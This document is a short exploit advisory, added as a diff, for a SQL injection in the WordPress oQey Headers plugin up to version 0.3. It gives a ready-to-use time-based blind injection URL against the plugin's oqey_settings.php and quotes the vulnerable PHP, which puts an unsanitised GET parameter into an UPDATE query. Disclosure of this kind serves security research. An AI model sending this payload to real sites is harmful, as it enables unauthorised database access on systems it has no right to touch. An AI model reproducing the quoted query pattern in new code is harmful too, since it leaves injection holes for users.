@@ -1,0 +1,20 @@
+# Exploit Title: WordPress oQey Headers plugin <= 0.3 SQL Injection Vulnerability
+# Date: 2011-08-26
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/oqey-headers.0.3.zip
+# Version: 0.3 (tested)
+# Note: magic_quotes has to be turned off
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/oqey-headers/oqey_settings.php?img_header_id[]=-1' AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20
+
+---------------
+Vulnerable code
+---------------
+if(isset($_GET['img_header_id'])){//order images
+foreach ($_GET['img_header_id'] as $position => $item){
+$h_update = sprintf("UPDATE $oqey_header SET oqey_h_order = '%d' WHERE oqey_h_id = '%s' ", $position,  $item
+);
+...
